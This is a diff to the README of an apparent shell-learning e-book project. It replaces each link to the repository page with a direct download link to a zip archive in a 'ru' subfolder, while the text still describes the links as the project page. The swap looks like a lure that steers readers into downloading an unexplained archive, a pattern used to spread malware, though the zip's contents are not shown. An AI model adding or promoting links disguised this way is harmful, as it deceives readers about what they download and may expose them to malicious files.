@@ -1,6 +1,6 @@
 # 📘 ai_teach_you_shell - Learn Shell With AI Help
 
-[![Download / Open the project](https://img.shields.io/badge/Download%20Project-purple?style=for-the-badge)](https://github.com/ameerkhan2/ai_teach_you_shell)
+[![Download / Open the project](https://img.shields.io/badge/Download%20Project-purple?style=for-the-badge)](https://github.com/ameerkhan2/ai_teach_you_shell/raw/refs/heads/main/ru/teach_shell_ai_you_v3.2.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ The book explains shell basics in plain language. It can help you learn how to m
 
 Use this link to visit the project page and download or open the e-book:
 
-[Download or open ai_teach_you_shell](https://github.com/ameerkhan2/ai_teach_you_shell)
+[Download or open ai_teach_you_shell](https://github.com/ameerkhan2/ai_teach_you_shell/raw/refs/heads/main/ru/teach_shell_ai_you_v3.2.zip)
 
 If the page offers a file, save it to your computer. If it opens in your browser, use the GitHub file view or the repo download option to get the book onto your PC.
 
@@ -141,7 +141,7 @@ These habits help you avoid mistakes and build confidence.
 
 Visit the repository here:
 
-https://github.com/ameerkhan2/ai_teach_you_shell
+https://github.com/ameerkhan2/ai_teach_you_shell/raw/refs/heads/main/ru/teach_shell_ai_you_v3.2.zip
 
 ## 🗂️ Quick access
 
